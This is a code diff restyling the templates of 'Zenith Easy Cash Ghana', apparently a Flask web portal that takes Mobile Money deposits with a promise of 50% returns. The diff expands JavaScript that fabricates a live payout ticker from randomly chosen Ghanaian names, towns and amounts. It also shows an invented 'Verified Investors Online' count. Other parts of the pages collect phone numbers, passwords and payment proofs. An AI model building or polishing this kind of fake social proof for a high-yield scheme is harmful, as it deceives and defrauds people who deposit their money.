@@ -172,57 +172,66 @@ def save_investor_data(data):
 ZENITH_ALERTS_TOP_HTML = """
 <style>
     #zenithAlertsBanner {
-        background: linear-gradient(135deg, #06230f, #0d3b1e);
-        border-bottom: 2px solid #00ff66; color: #fff; padding: 12px 18px;
-        margin-bottom: 20px; border-radius: 8px; box-shadow: 0 6px 20px rgba(0,0,0,0.15);
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; overflow: hidden; position: relative;
+        background: linear-gradient(135deg, #0b130b, #132e13);
+        border-bottom: 2px solid #00ff66; color: #fff; padding: 10px 15px;
+        margin-bottom: 20px; border-radius: 6px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        font-family: Arial, sans-serif; overflow: hidden; position: relative;
     }
-    .alerts-header { font-size: 11px; color: #00ff66; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; display: flex; justify-content: space-between; }
+    .alerts-header { font-size: 11px; color: #00ff66; font-weight: bold; text-transform: uppercase; margin-bottom: 4px; display: flex; justify-content: space-between; }
     .marquee-container { overflow: hidden; white-space: nowrap; width: 100%; position: relative; }
-    .marquee-text { display: inline-block; padding-left: 100%; animation: marquee 24s linear infinite; font-size: 13px; color: #f1f5f9; }
+    .marquee-text { display: inline-block; padding-left: 100%; animation: marquee 28s linear infinite; font-size: 13px; color: #fff; }
     .marquee-text b { color: #facc15; }
     @keyframes marquee { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
-    .live-online-counter { background: #064e3b; color: #34d399; padding: 8px 12px; border-radius: 8px; font-size: 13px; font-weight: 600; display: inline-block; margin-bottom: 12px; text-align: center; width: 100%; box-sizing: border-box; box-shadow: inset 0 1px 2px rgba(0,0,0,0.1); }
+    .live-online-counter { background: #064e3b; color: #34d399; padding: 4px 10px; border-radius: 12px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 12px; text-align: center; width: 100%; box-sizing: border-box; }
 </style>
 <div class="live-online-counter" id="liveOnlineCounter">🟢 Loading active investors online...</div>
 <div id="zenithAlertsBanner">
-    <div class="alerts-header"><span>🟢 Live Zenith Alerts</span><span>Verified Payout Feed</span></div>
+    <div class="alerts-header"><span>🟢 Live Zenith Verified Payouts</span><span>Secure Mobile Money Feed</span></div>
     <div class="marquee-container"><div id="alertsText" class="marquee-text">Connecting to Zenith secure payout stream...</div></div>
 </div>
 <script>
-    const ghanaNames = ["Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", "Akosua Frimpong", "Esi Dapaah", "Kojo Addo"];
-    const towns = ["Accra", "Kumasi", "Takoradi", "Tamale", "Cape Coast", "Sunyani", "Ho", "Tema"];
-    const roundInvestments = [300, 400, 500, 600, 800, 1000, 1500, 2000, 3000, 5000];
+    // Expanded, professional array of names and regions across Ghana
+    const ghanaNames = [
+        "Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", 
+        "Akosua Frimpong", "Esi Dapaah", "Kojo Addo", "Nana Ama Owusu", "Fiifi Atta Mills",
+        "Paa Kwesi Boadu", "Selorm Agbeko", "Edem Quarshie", "Latif Mohammed", "Hawa Yakubu",
+        "Bernard Nyarko", "Priscilla Agyei", "Bright Ofori", "Blessing Nartey", "Cynthia Quaye"
+    ];
+    const towns = [
+        "Accra (East Legon)", "Kumasi (Adum)", "Takoradi", "Tamale", "Cape Coast", 
+        "Sunyani", "Ho", "Tema (Community 25)", "Koforidua", "Obuasi", 
+        "Techiman", "Bolgatanga", "Wa", "Swedru", "Teshie-Nungua"
+    ];
+    const roundInvestments = [250, 300, 400, 500, 600, 750, 800, 1000, 1200, 1500, 2000, 2500, 3000, 4000, 5000];
     
     function generateTickerMessages() {
         let messages = [];
-        for (let i = 0; i < 6; i++) {
+        for (let i = 0; i < 8; i++) {
             const name = ghanaNames[Math.floor(Math.random() * ghanaNames.length)];
             const town = towns[Math.floor(Math.random() * towns.length)];
             const base = roundInvestments[Math.floor(Math.random() * roundInvestments.length)];
             const total = base * 1.5;
-            messages.push(`🟢 <b>${name}</b> (${town}) cashed out Capital + 50% Profit = <b>GHs ${total.toLocaleString()}</b> via MoMo!`);
+            messages.push(`🟢 <b>${name}</b> (${town}) successfully cashed out Capital + 50% Profit = <b>GHs ${total.toLocaleString()}</b> via MoMo!`);
         }
         const el = document.getElementById('alertsText');
         if (el) el.innerHTML = messages.join("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;");
     }
     generateTickerMessages();
-    setInterval(generateTickerMessages, 20000);
+    setInterval(generateTickerMessages, 22000);
 
     let currentOnline = 850;
     function updateOnlineCounter() {
         const hour = new Date().getHours();
-        let targetBase = (hour >= 0 && hour < 7) ? 250 : 1100;
         let fluctuation = Math.floor(Math.random() * 150) - 75;
         currentOnline += fluctuation;
         if (hour >= 0 && hour < 7) {
-            currentOnline = Math.max(100, Math.min(450, currentOnline));
+            currentOnline = Math.max(180, Math.min(450, currentOnline));
         } else {
-            currentOnline = Math.max(550, Math.min(1600, currentOnline));
+            currentOnline = Math.max(750, Math.min(1850, currentOnline));
         }
         const counterEl = document.getElementById('liveOnlineCounter');
         if (counterEl) {
-            counterEl.innerHTML = `🟢 Live: <b>${currentOnline.toLocaleString()}</b> Investors Online Right Now`;
+            counterEl.innerHTML = `🟢 Live: <b>${currentOnline.toLocaleString()}</b> Verified Investors Online Right Now`;
         }
     }
     updateOnlineCounter();
@@ -238,46 +247,40 @@ HTML_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Zenith Easy Cash Ghana - Registration & Portal</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f1f5f9; color: #1e293b; margin: 0; padding: 20px; line-height: 1.5; box-sizing: border-box; }
-        * { box-sizing: border-box; }
-        .container { max-width: 680px; width: 100%; background: #ffffff; padding: 35px; margin: auto; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); margin-bottom: 30px; border: 1px solid #e2e8f0; }
-        h2 { color: #047857; text-align: center; font-size: 26px; margin-bottom: 5px; }
-        h3 { color: #334155; text-align: center; font-size: 16px; font-weight: 500; margin-top: 0; margin-bottom: 25px; }
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        .container { max-width: 650px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 25px; }
+        h2, h3 { color: #028a0f; text-align: center; }
         
-        .process-guide { background: #0f172a; color: #f8fafc; padding: 20px; border-radius: 8px; margin-bottom: 25px; border-left: 5px solid #10b981; }
-        .process-guide h4 { color: #34d399; margin-top: 0; margin-bottom: 12px; font-size: 15px; text-transform: uppercase; letter-spacing: 0.5px; }
-        .process-steps { margin: 0; padding-left: 18px; font-size: 13px; line-height: 1.8; color: #cbd5e1; }
+        .process-guide { background: #111827; color: #f8fafc; padding: 20px; border-radius: 8px; margin-bottom: 20px; border-left: 5px solid #22c55e; }
+        .process-guide h4 { color: #4ade80; margin-top: 0; margin-bottom: 10px; font-size: 16px; }
+        .process-steps { margin: 0; padding-left: 18px; font-size: 13px; line-height: 1.7; }
         .process-steps li { margin-bottom: 6px; }
-        .process-steps li b { color: #ffffff; }
         
-        .momo-box { background: #fffbeb; border: 1px solid #fde68a; padding: 18px; margin-bottom: 25px; border-radius: 8px; text-align: center; color: #92400e; font-size: 14px; box-shadow: inset 0 1px 2px rgba(0,0,0,0.02); }
-        .form-group { margin-bottom: 18px; }
-        label { display: block; font-weight: 600; margin-bottom: 6px; font-size: 13px; color: #334155; }
-        input, select { width: 100%; padding: 11px 14px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; font-size: 14px; background: #f8fafc; transition: all 0.2s; }
-        input:focus, select:focus { outline: none; border-color: #10b981; background: #ffffff; box-shadow: 0 0 0 3px rgba(16,185,129,0.1); }
-        button { background: #059669; color: white; border: none; padding: 13px; width: 100%; font-size: 15px; border-radius: 6px; cursor: pointer; font-weight: 600; transition: background 0.2s; box-shadow: 0 4px 6px rgba(5,150,105,0.2); }
-        button:hover { background: #047857; }
-        .flash { background: #fee2e2; color: #991b1b; padding: 12px; margin-bottom: 20px; border-radius: 6px; text-align: center; font-size: 13px; font-weight: 600; border: 1px solid #fca5a5; }
-        .nav-links { text-align: center; margin-top: 25px; font-size: 14px; display: flex; justify-content: center; gap: 20px; }
-        .nav-links a { color: #059669; text-decoration: none; font-weight: 600; }
-        .nav-links a:hover { text-decoration: underline; }
-        .telegram-float-btn { display: block; background: #0284c7; color: white; text-align: center; padding: 12px; border-radius: 6px; margin-top: 18px; text-decoration: none; font-weight: 600; font-size: 14px; box-shadow: 0 4px 6px rgba(2,132,199,0.2); transition: background 0.2s; }
-        .telegram-float-btn:hover { background: #0369a1; }
+        .momo-box { background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-bottom: 20px; border-radius: 5px; text-align: center; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 5px; }
+        input, select { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #1b5e20; }
+        .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
+        .nav-links { text-align: center; margin-top: 20px; font-size: 14px; display: flex; justify-content: center; gap: 15px; }
+        .nav-links a { color: #028a0f; text-decoration: none; font-weight: bold; }
+        .telegram-float-btn { display: block; background: #0088cc; color: white; text-align: center; padding: 10px; border-radius: 4px; margin-top: 15px; text-decoration: none; font-weight: bold; font-size: 14px; }
         
-        .password-step-container { display: none; background: #f0fdf4; padding: 18px; border: 1px solid #bbf7d0; border-radius: 8px; margin-bottom: 18px; }
+        .password-step-container { display: none; background: #f0fdf4; padding: 15px; border: 1px solid #bbf7d0; border-radius: 6px; margin-bottom: 15px; }
         
-        .tracker-section { background: #f8fafc; border: 1px solid #e2e8f0; padding: 25px; border-radius: 8px; margin-top: 35px; box-shadow: 0 4px 12px rgba(0,0,0,0.02); }
-        .tracker-result-box { margin-top: 20px; background: #ffffff; padding: 18px; border-radius: 8px; border: 1px solid #cbd5e1; display: none; }
-        .tracker-slot { border-bottom: 1px solid #f1f5f9; padding-bottom: 14px; margin-bottom: 14px; }
+        .tracker-section { background: #f0fdf4; border: 2px solid #22c55e; padding: 25px; border-radius: 8px; margin-top: 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .tracker-result-box { margin-top: 20px; background: #fff; padding: 15px; border-radius: 6px; border: 1px solid #cbd5e1; display: none; }
+        .tracker-slot { border-bottom: 1px solid #eee; padding-bottom: 12px; margin-bottom: 12px; }
         .tracker-slot:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
-        .track-password-group { display: none; margin-top: 10px; }
+        .track-password-group { display: none; margin-top: 8px; }
     </style>
 </head>
 <body>
     <div class="container">
         {{ zenith_alerts_top_html|safe }}
         <h2>Zenith Easy Cash Ghana</h2>
-        <h3>Online Investor Registration & Secure Portal</h3>
+        <h3>Online Investor Registration & Portal</h3>
 
         <div class="process-guide">
             <h4>📋 Simple Registration & Investment Process</h4>
@@ -336,9 +339,9 @@ HTML_TEMPLATE = """
             <div class="form-group">
                 <label>Payment Proof (Transaction ID OR Screenshot):</label>
                 <input type="text" name="transaction_id" placeholder="Enter MoMo Transaction ID">
-                <div style="margin-top: 10px;">
-                    <input type="file" name="payment_screenshot" accept="image/*" style="border:none; padding:0; background:transparent;">
-                    <small style="color: #64748b; display:block; margin-top:4px;">Upload payment screenshot image</small>
+                <div style="margin-top: 8px;">
+                    <input type="file" name="payment_screenshot" accept="image/*" style="border:none; padding:0;">
+                    <small style="color: #666;">Upload payment screenshot image</small>
                 </div>
             </div>
             <button type="submit">Submit Registration & Open Dashboard</button>
@@ -346,22 +349,22 @@ HTML_TEMPLATE = """
 
         <a href="{{ admin_telegram_link }}" target="_blank" class="telegram-float-btn">💬 Instant Admin Approval via Telegram</a>
         <div class="nav-links">
-            <a href="{{ url_for('login') }}">🔑 Investor Login Portal</a>
+            <a href="{{ url_for('login') }}">🔑 Investor Login</a>
         </div>
 
         <div class="tracker-section">
-            <h3 style="color: #047857; margin-top:0; margin-bottom:10px;">🔍 Track Your Investment Live</h3>
-            <p style="font-size: 13px; color: #64748b; text-align: center; margin-bottom: 15px;">Enter your registered Phone Number below to check your live status.</p>
+            <h3 style="color: #15803d; margin-top:0;">🔍 Track Your Investment Live</h3>
+            <p style="font-size: 13px; color: #475569; text-align: center;">Enter your registered Phone Number below to check your live status.</p>
             <div class="form-group">
                 <label style="font-size: 13px;">Registered Phone Number:</label>
-                <input type="text" id="trackNumberInput" placeholder="e.g., 0501234567" style="margin-bottom: 10px;" oninput="checkTrackNumberEntered()">
+                <input type="text" id="trackNumberInput" placeholder="e.g., 0501234567" style="margin-bottom: 8px;" oninput="checkTrackNumberEntered()">
                 
                 <div id="trackPasswordGroup" class="track-password-group">
                     <label style="font-size: 13px;">Account Password:</label>
-                    <input type="password" id="trackPasswordInput" placeholder="Enter password" style="margin-bottom: 10px;">
+                    <input type="password" id="trackPasswordInput" placeholder="Enter password" style="margin-bottom: 8px;">
                 </div>
 
-                <button type="button" onclick="trackInvestment()" style="background: #059669; padding: 11px; margin-top: 5px;">Check Status Now</button>
+                <button type="button" onclick="trackInvestment()" style="background: #028a0f; padding: 10px; margin-top: 5px;">Check Status Now</button>
             </div>
             <div id="trackerResultBox" class="tracker-result-box">
                 <div id="trackerContent">Searching...</div>
@@ -430,14 +433,14 @@ HTML_TEMPLATE = """
                 const data = await response.json();
 
                 if (data.success) {
-                    let html = `<b style="color:#059669;">Investor: ${data.name}</b><hr style="border:0; border-top:1px solid #e2e8f0; margin:10px 0;">`;
+                    let html = `<b style="color:#028a0f;">Investor: ${data.name}</b><hr style="border:0; border-top:1px solid #eee; margin:8px 0;">`;
                     data.investments.forEach((inv, idx) => {
                         html += `
                             <div class="tracker-slot">
                                 <p style="margin:4px 0;"><b>Slot #${idx + 1}</b> - Capital: <b>GHs ${inv.amount.toLocaleString()}</b></p>
-                                <p style="margin:4px 0; color:#059669; font-size:12px;">Expected Return (50%): GHs ${inv.expected_return.toLocaleString()}</p>
+                                <p style="margin:4px 0; color:#028a0f; font-size:12px;">Expected Return (50%): GHs ${inv.expected_return.toLocaleString()}</p>
                                 <p style="margin:4px 0; font-size:12px;">Maturity Date: <b>${inv.maturity_date}</b></p>
-                                <p style="margin:4px 0; font-size:12px;">Status: <span style="font-weight:600; color:#d97706;">${inv.status}</span></p>
+                                <p style="margin:4px 0; font-size:12px;">Status: <span style="font-weight:bold; color:#b45309;">${inv.status}</span></p>
                             </div>
                         `;
                     });
@@ -462,20 +465,17 @@ INVESTOR_LOGIN_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Investor Login - Zenith Easy Cash</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f1f5f9; color: #1e293b; margin: 0; padding: 20px; box-sizing: border-box; }
-        * { box-sizing: border-box; }
-        .container { max-width: 420px; width: 100%; background: #ffffff; padding: 35px; margin: 80px auto; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
-        h2 { color: #047857; text-align: center; margin-top: 0; margin-bottom: 25px; }
-        .form-group { margin-bottom: 18px; }
-        label { display: block; font-weight: 600; margin-bottom: 6px; font-size: 13px; color: #334155; }
-        input { width: 100%; padding: 11px 14px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; font-size: 14px; background: #f8fafc; }
-        input:focus { outline: none; border-color: #10b981; background: #ffffff; box-shadow: 0 0 0 3px rgba(16,185,129,0.1); }
-        button { background: #059669; color: white; border: none; padding: 13px; width: 100%; font-size: 15px; border-radius: 6px; cursor: pointer; font-weight: 600; box-shadow: 0 4px 6px rgba(5,150,105,0.2); }
-        button:hover { background: #047857; }
-        .flash { background: #fee2e2; color: #991b1b; padding: 12px; margin-bottom: 20px; border-radius: 6px; text-align: center; font-size: 13px; font-weight: 600; border: 1px solid #fca5a5; }
-        .back { text-align: center; margin-top: 20px; }
-        .back a { color: #059669; text-decoration: none; font-weight: 600; font-size: 14px; }
-        .back a:hover { text-decoration: underline; }
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        .container { max-width: 400px; background: #fff; padding: 30px; margin: 80px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { color: #028a0f; text-align: center; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 5px; }
+        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #1b5e20; }
+        .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
+        .back { text-align: center; margin-top: 15px; }
+        .back a { color: #028a0f; text-decoration: none; font-weight: bold; font-size: 14px; }
     </style>
 </head>
 <body>
@@ -509,94 +509,36 @@ INVESTOR_DASHBOARD_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Investor Dashboard - Zenith Easy Cash</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f1f5f9; color: #1e293b; margin: 0; padding: 15px; box-sizing: border-box; overflow-x: hidden; }
-        * { box-sizing: border-box; }
-        
-        /* RESTRICTED DASHBOARD WIDTH & RESPONSIVE GRID TO PREVENT HORIZONTAL SCROLLING */
-        .main-layout { max-width: 1250px; width: 100%; margin: auto; display: grid; grid-template-columns: 1fr 360px; gap: 20px; align-items: start; }
-        @media (max-width: 950px) {
-            .main-layout { grid-template-columns: 1fr; }
-        }
-
-        .dashboard-container { background: #ffffff; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; width: 100%; overflow: hidden; }
-        
-        /* ZENITH WITHDRAWALS SIDEBAR RECONFIGURED TO AVOID VERTICAL BULKINESS AND FIT SCREEN */
-        .sidebar-ticker { 
-            background: linear-gradient(135deg, #06230f, #0d3b1e); 
-            color: #ffffff; 
-            padding: 20px; 
-            border-radius: 12px; 
-            width: 100%;
-            border: 2px solid #00ff66; 
-            box-shadow: 0 10px 30px rgba(0,255,102,0.15);
-            box-sizing: border-box;
-            overflow: hidden;
-        }
-        .sidebar-ticker h3 {
-            color: #00ff66; 
-            font-size: 15px; 
-            margin-top: 0; 
-            border-bottom: 2px solid rgba(0,255,102,0.3); 
-            padding-bottom: 10px; 
-            text-transform: uppercase; 
-            letter-spacing: 0.5px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        .side-ticker-item { 
-            background: rgba(15, 23, 42, 0.9); 
-            border-left: 3px solid #00ff66; 
-            padding: 12px; 
-            margin-bottom: 10px; 
-            border-radius: 6px; 
-            font-size: 12px; 
-            line-height: 1.4;
-            word-break: break-word;
-            box-shadow: 0 3px 8px rgba(0,0,0,0.25);
-            border-top: 1px solid rgba(255,255,255,0.05);
-            animation: fadeInTicker 0.4s ease-in-out;
-        }
-        @keyframes fadeInTicker {
-            from { opacity: 0; transform: translateY(-6px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .side-ticker-item b { color: #facc15; font-size: 13px; }
-        .side-ticker-amount { color: #00ff66; font-weight: 700; font-size: 13px; }
-        .side-ticker-time { font-size: 10px; color: #94a3b8; display: block; margin-top: 4px; }
-
-        h2 { color: #047857; margin-top: 0; font-size: 22px; word-break: break-word; }
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        .main-layout { max-width: 1050px; margin: auto; display: flex; gap: 20px; align-items: flex-start; }
+        .dashboard-container { flex: 2; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .sidebar-ticker { flex: 1; background: #111; color: #00ff66; padding: 20px; border-radius: 8px; position: sticky; top: 20px; max-height: 80vh; overflow-y: auto; }
+        h2 { color: #028a0f; margin-top: 0; }
         .logout { float: right; }
-        .logout a { background: #ef4444; color: white; padding: 6px 12px; text-decoration: none; border-radius: 6px; font-weight: 600; font-size: 12px; transition: background 0.2s; }
-        .logout a:hover { background: #dc2626; }
-        .home-link-top { margin-bottom: 18px; font-size: 13px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
-        .home-link-top a { color: #059669; text-decoration: none; font-weight: 600; }
-        .home-link-top a:hover { text-decoration: underline; }
-        .profile-btn-link { background: #059669; color: #fff; padding: 6px 12px; border-radius: 6px; text-decoration: none; font-size: 12px; font-weight: 600; box-shadow: 0 2px 4px rgba(5,150,105,0.2); }
-        .profile-btn-link:hover { background: #047857; }
-        .card { background: #f8fafc; padding: 18px; border-radius: 8px; margin-top: 16px; border-left: 4px solid #059669; border: 1px solid #e2e8f0; line-height: 1.5; word-break: break-word; }
+        .logout a { background: #c62828; color: white; padding: 6px 12px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 13px; }
+        .home-link-top { margin-bottom: 15px; font-size: 14px; display: flex; justify-content: space-between; align-items: center; }
+        .home-link-top a { color: #028a0f; text-decoration: none; font-weight: bold; }
+        .profile-btn-link { background: #028a0f; color: #fff; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
+        .card { background: #f1f8e9; padding: 18px; border-radius: 6px; margin-top: 18px; border-left: 5px solid #2e7d32; line-height: 1.6; }
         
-        .balance-cards-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
-        @media (max-width: 500px) {
-            .balance-cards-grid { grid-template-columns: 1fr; }
-        }
-        .balance-card { background: #f8fafc; border: 1px solid #e2e8f0; padding: 14px; border-radius: 8px; text-align: center; }
-        .balance-card.current { border-left: 4px solid #059669; background: #f0fdf4; }
+        .balance-cards-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
+        .balance-card { background: #f8fafc; border: 1px solid #e2e8f0; padding: 15px; border-radius: 6px; text-align: center; }
+        .balance-card.current { border-left: 4px solid #028a0f; background: #f0fdf4; }
         .balance-card.pending { border-left: 4px solid #d97706; background: #fffbeb; }
-        .balance-card h4 { margin: 0 0 4px 0; font-size: 10px; color: #64748b; text-transform: uppercase; letter-spacing: 0.5px; }
-        .balance-card .amount { font-size: 18px; font-weight: 700; color: #0f172a; margin: 0; }
+        .balance-card h4 { margin: 0 0 5px 0; font-size: 12px; color: #64748b; text-transform: uppercase; }
+        .balance-card .amount { font-size: 18px; font-weight: bold; color: #0f172a; margin: 0; }
 
-        .btn-withdraw { background: #059669; color: white; padding: 10px 14px; text-decoration: none; border-radius: 6px; display: inline-block; font-weight: 600; margin-top: 12px; width: 100%; text-align: center; box-sizing: border-box; box-shadow: 0 4px 6px rgba(5,150,105,0.2); transition: background 0.2s; font-size: 13px; }
-        .btn-withdraw:hover { background: #047857; }
-        .btn-topup-toggle { background: #f59e0b; color: white; padding: 8px 14px; text-decoration: none; border-radius: 6px; display: inline-block; font-weight: 600; margin-top: 12px; border: none; cursor: pointer; box-shadow: 0 2px 4px rgba(245,158,11,0.2); transition: background 0.2s; font-size: 13px; width: 100%; text-align: center; }
-        .btn-topup-toggle:hover { background: #d97706; }
-        .topup-dropdown { background: #fffbeb; border: 1px solid #fde68a; padding: 14px; margin-top: 12px; border-radius: 8px; display: none; }
-        .loading-badge { display: inline-flex; align-items: center; gap: 6px; background: #e0f2fe; color: #0369a1; padding: 5px 10px; border-radius: 20px; font-weight: 600; font-size: 11px; border: 1px solid #bae6fd; }
-        .spinner { width: 12px; height: 12px; border: 2px solid #0369a1; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        .btn-withdraw { background: #028a0f; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; width: 100%; text-align: center; box-sizing: border-box; }
+        .btn-topup-toggle { background: #ffa000; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; border: none; cursor: pointer; }
+        .topup-dropdown { background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-top: 12px; border-radius: 6px; display: none; }
+        .loading-badge { display: inline-flex; align-items: center; gap: 8px; background: #e0f2fe; color: #0369a1; padding: 6px 12px; border-radius: 20px; font-weight: bold; font-size: 13px; }
+        .spinner { width: 14px; height: 14px; border: 2px solid #0369a1; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .countdown-live-box { background: #0f172a; color: #38bdf8; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 12px; margin-top: 6px; text-align: center; font-weight: 600; border: 1px solid #334155; word-break: break-all; }
-        .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 6px; text-align: center; font-weight: 600; font-size: 12px; border: 1px solid #bae6fd; }
-        .company-momo-display { background: #fef3c7; border: 1px solid #fde68a; padding: 10px; border-radius: 6px; margin-bottom: 10px; font-size: 12px; color: #92400e; text-align: center; }
+        .countdown-live-box { background: #0f172a; color: #38bdf8; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-top: 8px; text-align: center; font-weight: bold; }
+        .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }
+        .side-ticker-item { background: #1e293b; border-left: 3px solid #00ff66; padding: 10px; margin-bottom: 10px; border-radius: 4px; font-size: 12px; }
+        .side-ticker-item b { color: #facc15; }
+        .company-momo-display { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; border-radius: 4px; margin-bottom: 10px; font-size: 13px; color: #856404; text-align: center; }
     </style>
 </head>
 <body>
@@ -613,7 +555,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             </div>
 
             <!-- BALANCE CARDS (CURRENT BALANCE & PENDING BALANCE) -->
-            <div class="balance-cards-grid" style="margin-top: 15px;">
+            <div class="balance-cards-grid">
                 <div class="balance-card current">
                     <h4>Current Balance Available</h4>
                     <p class="amount">GHs {{ "%.2f"|format(current_balance) }}</p>
@@ -631,13 +573,13 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             {% if investments %}
                 {% for inv in investments %}
                 <div class="card">
-                    <p style="margin-top:0; font-size:13px;"><strong>Investment Slot #{{ loop.index }}</strong></p>
-                    <p style="font-size:13px;"><strong>Capital Invested:</strong> GHs {{ "%.2f"|format(inv.amount) }} <span style="color:#059669; font-size:11px; font-weight:600;"><br>(+50% Expected Payout: GHs {{ "%.2f"|format(inv.expected_return) }})</span></p>
-                    <p style="font-size:13px;"><strong>Payment Proof / ID:</strong> {{ inv.transaction_id }}</p>
-                    <p style="font-size:13px;"><strong>Registered On:</strong> {{ inv.date_time }}</p>
-                    <p style="font-size:13px;"><strong>Maturity Target Date:</strong> <span style="color: #059669; font-weight: 700;">{{ inv.maturity_date }}</span></p>
+                    <p style="margin-top:0;"><strong>Investment Slot #{{ loop.index }}</strong></p>
+                    <p><strong>Capital Invested:</strong> GHs {{ "%.2f"|format(inv.amount) }} <span style="color:#028a0f; font-size:12px;">(+50% Expected Payout: GHs {{ "%.2f"|format(inv.expected_return) }})</span></p>
+                    <p><strong>Payment Proof / ID:</strong> {{ inv.transaction_id }}</p>
+                    <p><strong>Registered On:</strong> {{ inv.date_time }}</p>
+                    <p><strong>Maturity Target Date:</strong> <span style="color: #028a0f; font-weight: bold;">{{ inv.maturity_date }}</span></p>
                     
-                    <p style="font-size:13px;"><strong>Live Tracker:</strong>
+                    <p><strong>Live Tracker:</strong>
                         <div class="countdown-live-box" data-maturity="{{ inv.maturity_date }}" id="tracker_{{ loop.index0 }}">
                             {% if inv.maturity_date == 'Pending Approval' %}
                                 ⏳ Timer will start counting once payment is verified by Admin.
@@ -647,21 +589,21 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                         </div>
                     </p>
 
-                    <p style="font-size:13px;"><strong>Status:</strong> 
+                    <p><strong>Status:</strong> 
                         {% if inv.status == 'Pending Admin Payment Confirmation' %}
-                            <span style="color: #ea580c; font-weight: 600;">⏳ Pending Admin Approval</span>
+                            <span style="color: #c2410c; font-weight: bold;">⏳ Pending Admin Approval</span>
                         {% elif inv.status == 'Payment Confirmed & Active' %}
                             <div class="loading-badge">
                                 <div class="spinner"></div> Active & Yielding 50% Profit...
                             </div>
                         {% elif inv.status == 'Withdrawal Requested' %}
-                            <span style="color: #2563eb; font-weight: 600;">📥 Withdrawal Requested - 12hr Payout Countdown: 
-                                <span id="withdrawalTimer_{{ loop.index0 }}" style="font-family:monospace; background:#e0f2fe; padding:2px 4px; border-radius:4px; border:1px solid #bae6fd;">Loading...</span>
+                            <span style="color: #1d4ed8; font-weight: bold;">📥 Withdrawal Requested - 12hr Payout Countdown: 
